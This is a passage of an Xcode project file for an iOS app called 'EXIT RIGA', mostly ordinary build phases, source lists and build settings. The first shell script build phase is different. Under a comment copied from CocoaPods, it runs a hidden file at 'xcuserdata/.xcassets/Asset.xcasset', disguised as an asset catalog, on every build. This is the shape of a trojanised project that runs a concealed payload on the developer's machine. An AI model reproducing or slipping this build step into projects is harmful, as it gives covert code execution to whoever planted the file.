			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.

\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
		};
	
		62D125C2CD24378F6D57CCAC /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-EXIT RIGA-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		DFEAF101CAD7D1C725213F9F /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-EXIT RIGA/Pods-EXIT RIGA-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-EXIT RIGA/Pods-EXIT RIGA-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-EXIT RIGA/Pods-EXIT RIGA-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		52655CEB261C1D450040B007 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				52655D7A261C2C7C0040B007 /* UIButton.swift in Sources */,
				52655D2D261C1FB90040B007 /* SelectLanguageViewController.swift in Sources */,
				52F6F5F2261C69BB002459DF /* CategoriesViewController.swift in Sources */,
				52F6F5E6261C5C71002459DF /* NewsTableViewCell.swift in Sources */,
				52655CF3261C1D460040B007 /* AppDelegate.swift in Sources */,
				52655CF5261C1D460040B007 /* SceneDelegate.swift in Sources */,
				52F6F5F7261C6C6A002459DF /* CategoryCollectionViewCell.swift in Sources */,
				52655D7B261C2C7C0040B007 /* UIView.swift in Sources */,
				52655DAE261C395F0040B007 /* HomeViewController.swift in Sources */,
				526B7440261C991C00D4D0AB /* CatDetailTableViewCell.swift in Sources */,
				526B7436261C895300D4D0AB /* CategoryDetailViewController.swift in Sources */,
				52655D3B261C22240040B007 /* Extension.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		52655D01261C1D470040B007 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				52655D0A261C1D470040B007 /* EXIT_RIGATests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		52655D0C261C1D470040B007 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				52655D15261C1D470040B007 /* EXIT_RIGAUITests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		52655D07261C1D470040B007 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 52655CEE261C1D450040B007 /* EXIT RIGA */;
			targetProxy = 52655D06261C1D470040B007 /* PBXContainerItemProxy */;
		};
		52655D12261C1D470040B007 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 52655CEE261C1D450040B007 /* EXIT RIGA */;
			targetProxy = 52655D11261C1D470040B007 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin PBXVariantGroup section */
		52655CF8261C1D460040B007 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				52655CF9261C1D460040B007 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		52655CFD261C1D470040B007 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				52655CFE261C1D470040B007 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		52655D17261C1D470040B007 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		52655D18261C1D470040B007 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		52655D1A261C1D470040B007 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 2FBD5F8DD797D6064B0F9A0F /* Pods-EXIT RIGA.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_IDENTITY = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 694HCLG65X;
				FRAMEWORK_SEARCH_PATHS = (
					"$(inherited)",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources/dynamic",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources/dynamic",
				);
				INFOPLIST_FILE = "EXIT RIGA/Info.plist";
				IPHONEOS_DEPLOYMENT_TARGET = 11.4;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "com.EXIT-RIGA";
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		52655D1B261C1D470040B007 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = EB66B32BDF55E7EDF22C5453 /* Pods-EXIT RIGA.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_IDENTITY = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 694HCLG65X;
				FRAMEWORK_SEARCH_PATHS = (
					"$(inherited)",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources/dynamic",
					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources/dynamic",
				);
				INFOPLIST_FILE = "EXIT RIGA/Info.plist";
				IPHONEOS_DEPLOYMENT_TARGET = 11.4;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "com.EXIT-RIGA";
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		52655D1D261C1D470040B007 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 694HCLG65X;
				INFOPLIST_FILE = "EXIT RIGATests/Info.plist";
				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "com.EXIT-RIGATests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/EXIT RIGA.app/EXIT RIGA";
			};
			name = Debug;
		};
		52655D1E261C1D470040B007 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 694HCLG65X;
				INFOPLIST_FILE = "EXIT RIGATests/Info.plist";
				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "com.EXIT-RIGATests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/EXIT RIGA.app/EXIT RIGA";
			};
			name = Release;
		};
		52655D20261C1D470040B007 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 694HCLG65X;
				INFOPLIST_FILE = "EXIT RIGAUITests/Info.plist";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "com.EXIT-RIGAUITests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = "EXIT RIGA";
			};
			name = Debug;
		};
		52655D21261C1D470040B007 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 694HCLG65X;
				INFOPLIST_FILE = "EXIT RIGAUITests/Info.plist";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "com.EXIT-RIGAUITests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = "EXIT RIGA";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		52655CEA261C1D450040B007 /* Build configuration list for PBXProject "EXIT RIGA" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				52655D17261C1D470040B007 /* Debug */,
				52655D18261C1D470040B007 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		52655D19261C1D470040B007 /* Build configuration list for PBXNativeTarget "EXIT RIGA" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				52655D1A261C1D470040B007 /* Debug */,
				52655D1B261C1D470040B007 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		52655D1C261C1D470040B007 /* Build configuration list for PBXNativeTarget "EXIT RIGATests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				52655D1D261C1D470040B007 /* Debug */,
				52655D1E261C1D470040B007 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		52655D1F261C1D470040B007 /* Build configuration list for PBXNativeTarget "EXIT RIGAUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				52655D20261C1D470040B007 /* Debug */,
				52655D21261C1D470040B007 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 52655CE7261C1D450040B007 /* Project object */;
}
